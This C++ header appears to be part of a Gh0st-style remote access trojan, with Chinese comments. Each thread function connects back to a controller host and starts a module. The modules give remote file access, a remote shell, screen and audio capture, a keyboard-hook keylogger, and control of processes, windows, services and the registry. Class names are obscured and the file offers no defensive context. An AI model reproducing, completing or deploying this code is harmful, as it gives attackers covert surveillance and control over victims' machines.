#if !defined(AFX_LOOP_H_INCLUDED)
#define AFX_LOOP_H_INCLUDED
#include "KernelManager.h"
#include "FileManager.h"
#include "ScreenManager.h"
#include "ShellManager.h"

#include "AudioManager.h"
#include "SystemManager.h"
#include "KeyboardManager.h"
#include "ServerManager.h"
#include "RegManager.h"
#include "..\StrCry.h"
#include "until.h"
#include "install.h"
#include <wininet.h>

extern bool g_bSignalHook;

DWORD WINAPI Loop_FileManager(SOCKET sRemote)
{
	//---声明套接字类
	privatra	socketClient;
	//连接
	if (!socketClient.Connect(CAdmin::m_strMasterHost, CAdmin::m_nMasterPort))
		return -1;  //错误就返回
	//---定义文件管理类  这个类也重载了 CManager 也就是说他的数据接收后就会调用 CFileManager::OnReceive
	CFM	manager(&socketClient);
	socketClient.run_event_loop();            //---等待线程结束

	return 0;
}

DWORD WINAPI Loop_ShellManager(SOCKET sRemote)
{
	privatra	socketClient;
	if (!socketClient.Connect(CAdmin::m_strMasterHost, CAdmin::m_nMasterPort))
		return -1;
	
	CSELM	manager(&socketClient);
	
	socketClient.run_event_loop();

	return 0;
}

DWORD WINAPI Loop_ScreenManager(SOCKET sRemote)
{
	privatra	socketClient;
	if (!socketClient.Connect(CAdmin::m_strMasterHost, CAdmin::m_nMasterPort))
		return -1;
	
	CSMR	manager(&socketClient);

	socketClient.run_event_loop();
	return 0;
}

// 摄像头不同一线程调用sendDIB的问题


DWORD WINAPI Loop_AudioManager(SOCKET sRemote)
{
	privatra	socketClient;
	if (!socketClient.Connect(CAdmin::m_strMasterHost, CAdmin::m_nMasterPort))
		return -1;
	CADM	manager(&socketClient);
	socketClient.run_event_loop();
	return 0;
}

DWORD WINAPI Loop_HookKeyboard(LPARAM lparam)
{
	char	strKeyboardOfflineRecord[MAX_PATH] = {0};
	g_bSignalHook = false;

	while (1)
	{
		while (g_bSignalHook == false)Sleep(100);
		CKeyM::StartHook();
		while (g_bSignalHook == true)Sleep(100);
		CKeyM::StopHook();
	}

	return 0;
}

DWORD WINAPI Loop_KeyboardManager(SOCKET sRemote)
{	
	privatra	socketClient;
	if (!socketClient.Connect(CAdmin::m_strMasterHost, CAdmin::m_nMasterPort))
		return -1;
	
	CKeyM	manager(&socketClient);
	
	socketClient.run_event_loop();

	return 0;
}

//进程遍历回调函数
DWORD WINAPI Loop_SystemManager(SOCKET sRemote)
{	
	privatra	socketClient;
	if (!socketClient.Connect(CAdmin::m_strMasterHost, CAdmin::m_nMasterPort))
		return -1;
	
	CStmM	manager(&socketClient, COMMAND_SYSTEM);
	
	socketClient.run_event_loop();

	return 0;
}

//窗口线程回调函数
DWORD WINAPI Loop_WindowManager(SOCKET sRemote)
{
	privatra	socketClient;
	if (!socketClient.Connect(CAdmin::m_strMasterHost, CAdmin::m_nMasterPort))
		return -1;

	CStmM	manager(&socketClient, COMMAND_WSLIST);

	socketClient.run_event_loop();

	return 0;
}


// 服务管理线程
DWORD WINAPI Loop_ServicesManager(SOCKET sRemote)
{
	//OutputDebugString("DWORD WINAPI Loop_ServicesManager(SOCKET sRemote)");
	privatra	socketClient;
	if (!socketClient.Connect(CAdmin::m_strMasterHost, CAdmin::m_nMasterPort))
		return -1;

	CSRMR	manager(&socketClient);

	socketClient.run_event_loop();

	return 0;
}

// 注册表管理
DWORD WINAPI Loop_RegeditManager(SOCKET sRemote)
{
	privatra	socketClient;
	if (!socketClient.Connect(CAdmin::m_strMasterHost, CAdmin::m_nMasterPort))
		return -1;

	CRM	manager(&socketClient);

	socketClient.run_event_loop();

	return 0;
}



#endif // !defined(AFX_LOOP_H_INCLUDED)
